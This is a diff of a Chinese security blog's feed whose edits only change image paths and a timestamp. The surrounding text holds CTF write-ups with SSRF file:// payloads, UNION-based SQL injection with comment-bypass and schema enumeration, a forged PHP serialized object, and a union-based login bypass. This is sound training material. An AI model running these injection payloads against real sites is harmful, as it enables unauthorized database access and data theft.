 &lt;/ul&gt;
@@ -2794,7 +2794,7 @@ HANDLER FlagHere CLOSE;#
 &lt;/div&gt;&lt;p&gt;可以通过在 blog输入框上传以下 payload 访问 flag.php文件&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;file:///var/html/flag.php
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接在 join页面上传是不行的，从服务器的备份文件可以看出这个表达式被正则表达式过滤了&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180731.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180731.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;返回 Blog is not valid.&lt;/li&gt;
 &lt;/ul&gt;
@@ -2813,16 +2813,16 @@ HANDLER FlagHere CLOSE;#
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?no=-1 order by 4
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;union select&lt;/code&gt; 被过滤，用 &lt;code&gt;/**/&lt;/code&gt; 绕过&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?no=-1 union/**/select 1,2,3,4
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180744.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180744.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;爆表名：users&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?no=-1 union/**/select 1, group_concat(table_name),3,4 from information_schema.tables where table_schema=database();
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180755.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180755.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;爆列名：可疑data&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?no=-1 union/**/select 1, group_concat(column_name),3,4 from information_schema.columns where table_name=&amp;#39;users&amp;#39;
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180802.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180802.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;爆data列&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?no=-1 union/**/select 1, group_concat(data),3,4 from users
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180808.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180808.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;h3 id=&#34;从序列化字符串注入&#34;&gt;从序列化字符串注入&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;O:8:&amp;#34;UserInfo&amp;#34;:3:{s:4:&amp;#34;name&amp;#34;;s:2:&amp;#34;11&amp;#34;;s:3:&amp;#34;age&amp;#34;;i:11;s:4:&amp;#34;blog&amp;#34;;s:5:&amp;#34;sh.sh&amp;#34;;}
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从SQLi得到的序列化字符串可以猜测：&lt;/p&gt;
@@ -2839,7 +2839,7 @@ HANDLER FlagHere CLOSE;#
 &lt;li&gt;data字段在第4位，所以放在第4位&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;得到 flag
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180818.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180818.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;flag{ce4753a0-ec46-4fc1-81eb-ad8a2eeaf5b2}&lt;/li&gt;
 &lt;/ul&gt;
@@ -2905,7 +2905,7 @@ HANDLER FlagHere CLOSE;#
             <title type="text">GXYCTF2019---BabySQli</title>
             <link rel="alternate" type="text/html" href="https://bu44er.top/posts/sec/wp/gxyctf2019---babysqli/" />
             <id>https://bu44er.top/posts/sec/wp/gxyctf2019---babysqli/</id>
-            <updated>2024-11-14T01:00:19&#43;08:00</updated>
+            <updated>2024-11-14T15:06:26&#43;08:00</updated>
             <published>2024-09-16T18:03:22&#43;08:00</published>
             <author>
                     <name>bu44er</name>
@@ -2914,13 +2914,13 @@ HANDLER FlagHere CLOSE;#
                     </author>
             <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
 &lt;p&gt;登录框
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180547.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180547.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
 &lt;h3 id=&#34;爆-wrong-user&#34;&gt;爆 wrong user&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916181350.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916181350.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;猜测要先通过用户名的检测，注释提示 `select * from user where username = &#39;$name&#39;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916181354.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916181354.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;先 base32解密，再base64加密&lt;/li&gt;
 &lt;/ul&gt;
@@ -2929,13 +2929,13 @@ HANDLER FlagHere CLOSE;#
             
                 <content type="html">&lt;h2 id=&#34;题目&#34;&gt;题目&lt;/h2&gt;
 &lt;p&gt;登录框
-&lt;img src=&#34;../../../../img/Pasted%20image%2020240916180547.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916180547.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;hr&gt;
 &lt;h2 id=&#34;分析&#34;&gt;分析&lt;/h2&gt;
 &lt;h3 id=&#34;爆-wrong-user&#34;&gt;爆 wrong user&lt;/h3&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916181350.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916181350.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;猜测要先通过用户名的检测，注释提示 `select * from user where username = &#39;$name&#39;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916181354.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916181354.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;先 base32解密，再base64加密&lt;/li&gt;
 &lt;/ul&gt;
@@ -2965,7 +2965,7 @@ HANDLER FlagHere CLOSE;#
 &lt;ul&gt;
 &lt;li&gt;虚拟是指 union 产生的数据是临时的，在下次查询的时候就不存在了，因为它没有实际保存在数据库中&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src=&#34;../../../../img/Pasted%20image%2020240916181534.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../../../../img/Pasted%20image%2020240916181534.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以通过往表中添加一条当前用户名和自定义密码的数据，通过对密码的检测。&lt;/p&gt;
 </content>
             
